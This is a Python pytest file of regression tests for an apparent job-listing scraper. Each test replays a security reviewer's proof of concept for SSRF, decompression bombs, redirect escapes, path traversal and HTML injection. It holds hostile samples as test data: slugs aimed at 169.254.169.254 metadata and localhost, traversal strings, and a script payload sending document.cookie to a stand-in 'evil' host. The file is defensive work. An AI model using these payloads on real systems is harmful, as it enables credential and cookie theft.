"""Regression tests for the BUILD V1/V3 security and robustness findings.

One test per finding, each reproducing the reviewer's own PoC:

* V3 S1  — SSRF: a `companies` entry reaching any host and port
* V3 S2  — decompression bomb in the company directory
* V3 S3  — decompression bomb in any HTTP response body
* V3 S5  — `Retry-After: inf`
* V3 S6  — Lever pagination that never terminates
* V3 S12 — a career-site host read out of a query string
* V3 S19 — a redirect leaving the host allowlist entirely
* V3 S20 — decompression caps larger than the container they run in
* V3 S23 — `descriptionHtml` shipping live `<script>` / `on*=` handlers
* V3 S25 — a `//` in a path or query faking a host position
* V3 S27 — unvalidated `ATS_REPO_OWNER`, and `..` inside a directory commit
* V1 B1 / V3 S4 — `includeRawJson` re-exporting what `redactContacts` removed
"""

from __future__ import annotations

import gzip
import io

import httpx
import pytest
import respx

from core import directory as directory_mod
from core import http as http_mod
from core.directory import MAX_DIRECTORY_BYTES, parse_jsonl
from core.http import (
    MAX_RESPONSE_BYTES,
    HttpError,
    ParseError,
    check_host,
    checked_env,
    make_client,
    retry_after_seconds,
)
from core.models import Ref
from core.normalize.html import sanitize_html
from core.normalize.record import build_job_record
from core.normalize.redact import strip_contact_fields
from core.providers import greenhouse, lever
from core.resolve import Unresolved, parse_prefix, parse_url, resolve, valid_slug

REF = Ref(provider="greenhouse", slug="acme")


@pytest.fixture
def client():
    """Rate limiting on a fake clock, so the 1 rps Lever bucket costs no wall time."""
    clock = [0.0]

    async def sleep(seconds: float) -> None:
        clock[0] += seconds

    return make_client(timeout_secs=5, sleep=sleep, clock=lambda: clock[0])


# --- V3 S1: SSRF ---------------------------------------------------------------------


@pytest.mark.parametrize(
    "entry",
    [
        "recruitee:169.254.169.254?",
        "recruitee:localhost:6379?",
        "personio:127.0.0.1:8080#",
        "greenhouse:acme@evil.example",
        "lever:acme/../../etc",
        "greenhouse:..",
        "recruitee:acme%2e%2e",
    ],
)
def test_a_slug_can_never_terminate_the_url_authority(entry):
    """V3 S1: `?`, `#`, `:` and `@` used to survive into the hostname."""
    assert parse_prefix(entry) is None
    result = resolve(entry)
    assert getattr(result, "status", None) is not None, f"{entry} still resolved to a Ref"


def test_valid_slug_is_a_positive_charset():
    assert valid_slug("acme") and valid_slug("acme-eu_1.2")
    assert not valid_slug("") and not valid_slug("-acme") and not valid_slug("api")
    assert not valid_slug("a" * 101)


def test_client_refuses_a_host_that_is_not_an_ats_or_directory_host():
    """The sink guard, so a future call site cannot re-open S1."""
    check_host("https://boards-api.greenhouse.io/v1/boards/acme/jobs")
    check_host("https://cdn.jsdelivr.net/gh/o/ats-directory@main/companies.jsonl.gz")
    for bad in (
        "https://169.254.169.254/latest/meta-data/",
        "https://localhost:6379/",
        "http://boards-api.greenhouse.io/v1/boards/acme/jobs",  # plaintext
        "https://greenhouse.io.evil.example/",
    ):
        with pytest.raises(HttpError):
            check_host(bad)


async def test_client_get_refuses_a_non_ats_host(client):
    with pytest.raises(HttpError):
        await client.get("https://169.254.169.254/latest/meta-data/")


def test_directory_rows_with_an_unusable_slug_are_skipped():
    """A poisoned directory row is the same vector as a poisoned input (V3 S1)."""
    rows = [
        {"provider": "recruitee", "slug": "169.254.169.254?"},
        {"provider": "recruitee", "slug": "bunq"},
    ]
    found = directory_mod.Directory(rows).lookup("bunq")
    assert [ref.slug for ref in found] == ["bunq"]
    assert directory_mod.Directory(rows).lookup("169.254.169.254?") == []


# --- V3 S12: host read out of a query string -----------------------------------------


def test_a_career_site_host_is_only_read_from_the_host_position():
    assert parse_url("https://attacker.example/?x=jobs.lever.co/palantir") is None
    assert parse_url("https://jobs.lever.co/palantir").slug == "palantir"
    assert parse_url("jobs.lever.co/palantir").slug == "palantir"
    assert parse_url("https://bunq.recruitee.com").slug == "bunq"


# --- V3 S2 / S3: decompression bombs --------------------------------------------------


SMALL_LIMIT = 64 * 1024


def _bomb(size: int) -> bytes:
    buffer = io.BytesIO()
    with gzip.GzipFile(fileobj=buffer, mode="wb") as handle:
        handle.write(b"\0" * size)
    return buffer.getvalue()


def test_directory_gzip_is_capped(monkeypatch):
    """V3 S2: 102 kB in, 100 MB out, 1 GB peak RSS — OOM at every memory tier."""
    # V3 S20: the cap is sized against the *container*, not against what a bomb looks
    # like. `parse_jsonl` turns wire bytes into resident dicts at a measured 6.9x, so a
    # 64 MB cap admitted a 25 kB file needing ~444 MB against `minMemoryMbytes: 256`.
    # Asserting the relationship rather than the number is what keeps the two in step.
    assert MAX_DIRECTORY_BYTES * 7 < 256 * 1024 * 1024
    monkeypatch.setattr(directory_mod, "MAX_DIRECTORY_BYTES", SMALL_LIMIT)
    blob = _bomb(SMALL_LIMIT * 64)
    assert len(blob) < 20_000, "precondition: the bomb is small on the wire"
    with pytest.raises(ValueError):
        parse_jsonl(blob)
    # A directory that does not fit is a missing directory, never a failed run.
    assert directory_mod._rows(blob) == []
    assert parse_jsonl(gzip.compress(b'{"provider": "lever", "slug": "acme"}'))


@respx.mock
async def test_response_body_is_capped(client, monkeypatch):
    """V3 S3: httpx inflates `Accept-Encoding: gzip` into `.content` with no limit."""
    # V3 S20: the cap is per *response* and `maxConcurrency` reaches 32, so the product is
    # what has to fit inside `actor.json`'s `maxMemoryMbytes: 1024`.
    assert 32 * MAX_RESPONSE_BYTES <= 768 * 1024 * 1024
    # And Greenhouse's graceful re-fetch-without-descriptions guard has to trip *below*
    # the transport's hard cap, or `read_capped` raises first and that path is dead code.
    assert greenhouse.MAX_BODY_BYTES < MAX_RESPONSE_BYTES
    monkeypatch.setattr("core.http.MAX_RESPONSE_BYTES", SMALL_LIMIT)
    url = "https://boards-api.greenhouse.io/v1/boards/acme/jobs"
    respx.get(url).mock(
        return_value=httpx.Response(
            200,
            headers={"content-encoding": "gzip"},
            content=_bomb(SMALL_LIMIT * 64),
        )
    )
    with pytest.raises(ParseError):
        await client.get(url)


@respx.mock
async def test_a_normal_body_still_decodes(client):
    """The cap must not change the ordinary path: gzip in, parsed JSON out."""
    url = "https://boards-api.greenhouse.io/v1/boards/acme/jobs"
    payload = gzip.compress(b'{"jobs": [{"id": 1}]}')
    respx.get(url).mock(
        return_value=httpx.Response(
            200,
            headers={"content-encoding": "gzip", "content-type": "application/json"},
            content=payload,
        )
    )
    assert await client.get_json(url) == {"jobs": [{"id": 1}]}


# --- V3 S5: Retry-After ---------------------------------------------------------------


@pytest.mark.parametrize(
    ("header", "expected"),
    [("30", 30.0), ("120", 60.0), ("99999999", 60.0), ("inf", None), ("1e309", None), ("-5", 0.0)],
)
def test_retry_after_is_clamped(header, expected):
    response = httpx.Response(429, headers={"retry-after": header})
    assert retry_after_seconds(response) == expected


# --- V3 S6: Lever pagination ----------------------------------------------------------


@respx.mock
async def test_lever_pagination_terminates(client):
    """A host answering every page exactly full used to loop forever."""
    page = [{"id": f"job-{n}", "text": "x"} for n in range(lever.PAGE_SIZE)]
    route = respx.get(url__startswith="https://api.lever.co/v0/postings/loop").mock(
        return_value=httpx.Response(200, json=page)
    )
    with pytest.raises(ParseError):
        await lever._postings_for(client, "api.lever.co", "loop")
    assert route.call_count == lever.MAX_PAGES


# --- V1 B1 / V3 S4: raw must not re-export what redaction removed ---------------------


def test_raw_never_carries_contact_shaped_keys_or_ad_bodies():
    job = {
        "id": 1,
        "title": "Engineer",
        "mailbox_email": "job.2dvvr@vandebron.recruitee.com",
        "recruiter": {"name": "Anna", "phone": "+31 6 12345678"},
        "activeJobApplication": {"creator": {"email": "x@y.nl"}},
        "hiringManager": "Anna Jansen",
        "content": "<p>Bel Anna op +31 6 12345678 of mail anna.jansen@vandebron.nl</p>",
        "questions": [{"label": "Notes", "value": "reach me at anna.jansen@vandebron.nl"}],
    }
    record = build_job_record(
        REF, {"job": job, "sourceId": "1", "title": "Engineer"}, {"includeRawJson": True}
    )
    blob = str(record.raw)
    assert "@" not in blob and "12345678" not in blob, blob
    assert record.raw["id"] == 1 and record.raw["title"] == "Engineer"
    for gone in ("mailbox_email", "recruiter", "activeJobApplication", "hiringManager", "content"):
        assert gone not in record.raw
    assert record.raw["questions"] == [{"label": "Notes", "value": "reach me at [redacted]"}]


def test_raw_is_null_unless_asked_for():
    record = build_job_record(REF, {"job": {"id": 1}, "sourceId": "1", "title": "T"}, {})
    assert record.raw is None


def test_strip_contact_fields_is_depth_bounded():
    deep = current = {}
    for _ in range(40):
        current["next"] = current = {}
    assert strip_contact_fields(deep) is not None  # terminates, does not recurse forever


# --- V3 S19: check_host ran on the first URL only --------------------------------------


@respx.mock
async def test_a_redirect_cannot_leave_the_allowlist(client):
    """V3 S19: `Client.get` validated the URL it was handed, then let httpx follow the
    chain itself with nothing re-entering `check_host`. `core/directory.py` is that call
    site and it passes `follow_redirects=True`, so a 302 off an allowlisted host reached
    plaintext link-local — both the allowlist and the https-only rule bypassed at once."""
    start = "https://cdn.jsdelivr.net/gh/o/ats-directory@main/companies.jsonl.gz"
    respx.get(start).mock(
        return_value=httpx.Response(
            302, headers={"location": "http://169.254.169.254/latest/meta-data/"}
        )
    )
    leak = respx.get("http://169.254.169.254/latest/meta-data/").mock(
        return_value=httpx.Response(200, content=b"AKIA-SECRET")
    )
    with pytest.raises(HttpError):
        await client.get(start, follow_redirects=True)
    assert leak.call_count == 0, "the hop must never be issued at all"


@respx.mock
async def test_an_allowlisted_redirect_still_works(client):
    """The guard must not break the redirect the adapters legitimately follow."""
    start = "https://boards-api.greenhouse.io/v1/boards/acme/jobs"
    respx.get(start).mock(
        return_value=httpx.Response(
            301, headers={"location": "https://job-boards.greenhouse.io/acme"}
        )
    )
    respx.get("https://job-boards.greenhouse.io/acme").mock(
        return_value=httpx.Response(200, content=b"[]")
    )
    response = await client.get(start, follow_redirects=True)
    assert response.content == b"[]"


# --- V3 S25: `//` faked a host position anywhere in the entry -------------------------


@pytest.mark.parametrize(
    "entry",
    [
        "https://attacker.example/r?u=//jobs.lever.co/palantir",
        "https://attacker.example/#//bunq.recruitee.com",
        "http://evil.test/a//jobs.ashbyhq.com/openai",
        "https://evil.example/?for=stripe&h=//boards.greenhouse.io/embed/job_board",
    ],
)
def test_a_double_slash_in_a_path_or_query_is_not_a_host(entry: str):
    """V3 S25, the residue of S12: the patterns anchored on `(?:\\A|//)` but `//` was
    matched *anywhere*, so the entry the user reads and the board they are billed for were
    different companies. No SSRF — the fetch still went to the real ATS host."""
    assert parse_url(entry) is None
    assert isinstance(resolve(entry), Unresolved)


@pytest.mark.parametrize(
    ("entry", "provider", "slug"),
    [
        ("jobs.lever.co/palantir", "lever", "palantir"),
        ("https://jobs.eu.lever.co/wise", "lever", "wise"),
        ("https://www.bunq.recruitee.com/o/dev", "recruitee", "bunq"),
        ("https://boards.greenhouse.io/embed/job_board?for=stripe", "greenhouse", "stripe"),
        ("https://job-boards.greenhouse.io/anthropic/jobs/4019283", "greenhouse", "anthropic"),
        # §5.11/§6.4 keep a slug verbatim, and Recruitee/Personio carry it in the *host* —
        # so the canonical target cannot be built from the lowercasing `urlsplit.hostname`.
        ("https://Acme-Corp.recruitee.com/o/engineer", "recruitee", "Acme-Corp"),
        ("https://Personio.jobs.personio.de/xml", "personio", "Personio"),
    ],
)
def test_every_live_url_form_still_resolves(entry: str, provider: str, slug: str):
    ref = parse_url(entry)
    assert ref is not None and (ref.provider, ref.slug) == (provider, slug)


@pytest.mark.parametrize(
    "entry", ["https://acme.recruitee.com:8080/o/x", "https://u:p@acme.recruitee.com/o/x"]
)
def test_a_port_or_userinfo_still_fails_to_match(entry: str):
    """V3 S1 stays closed: the netloc is used verbatim, so anything carrying an authority
    trick simply fails the anchored pattern rather than yielding a Ref."""
    assert parse_url(entry) is None


# --- V3 S23: descriptionHtml shipped live executable markup ---------------------------


def test_description_html_carries_no_executable_markup():
    """V3 S23 / S8: the ad body is employer-written, arrives over an unauthenticated public
    endpoint, and buyers render it. `html.py` dropped `<script>` for the *text* rendering
    only; `descriptionHtml` was passed through byte-for-byte, and Greenhouse's is
    `html.unescape`d first, which turns an escaped payload into live markup in ours."""
    record = build_job_record(
        REF,
        {
            "sourceId": "1",
            "title": "T",
            "descriptionHtml": (
                '<p>hi</p><script>fetch("//evil/?c="+document.cookie)</script>'
                '<img src=x onerror=alert(1)><a href="javascript:x()">a</a>'
                '<IFRAME SRC="//evil"></IFRAME><div ONCLICK="a()">t</div>'
            ),
        },
        {"includeDescription": True, "descriptionFormat": "html"},
    )
    html = record.descriptionHtml
    for payload in ("<script", "onerror", "onclick", "javascript:", "<iframe"):
        assert payload not in html.lower(), payload
    assert "<p>hi</p>" in html and "<div>t</div>" in html, "formatting must survive"


@pytest.mark.parametrize(
    "body",
    [
        '<p>Keep <strong>this</strong> and <a href="https://acme.com/apply">apply</a></p>',
        "<p>3 &lt; 5 and on-site work</p>",
        '<span data-on="x">ok</span>',
    ],
)
def test_a_benign_ad_body_is_untouched(body: str):
    """The sanitiser must not corrupt the product: `data-on=` is not an event handler."""
    assert sanitize_html(body) == body


# --- V3 S20 / S27: caps and env validation --------------------------------------------


def test_the_directory_row_count_is_capped(monkeypatch):
    """V3 S20: bytes alone were not enough — a pathological line count reaches the same
    OOM by another door, and `_rows` degrades a ValueError to "this source missed"."""
    monkeypatch.setattr(directory_mod, "MAX_DIRECTORY_ROWS", 10)
    blob = b"\n".join(b'{"provider": "lever", "slug": "acme%d"}' % i for i in range(50))
    with pytest.raises(ValueError):
        parse_jsonl(blob)
    assert directory_mod._rows(blob) == []


@pytest.mark.parametrize("bad", ["../../evil", "own er", "a" * 40, "", "o/../x"])
def test_a_malformed_repo_owner_never_reaches_a_url_or_the_user_agent(bad: str):
    """V3 S27: `ATS_REPO_OWNER` was formatted straight into the User-Agent unvalidated,
    while its two sibling env knobs were checked — and the UA is the entire legal
    posture's identifier (§5, §14 R21). One validator now, not two."""
    assert checked_env(bad, http_mod._OWNER_RE, "ats-jobs") == "ats-jobs"


@pytest.mark.parametrize("bad", ["..", "a/../b", "....", "x" * 41])
def test_a_directory_commit_cannot_traverse(bad: str):
    """V3 S27: `_COMMIT_RE` admitted `..`, so `@../companies.jsonl.gz` was path confusion
    inside jsDelivr. `check_host` still pinned the host, which is why this is a LOW."""
    assert checked_env(bad, directory_mod._COMMIT_RE, "main") == "main"
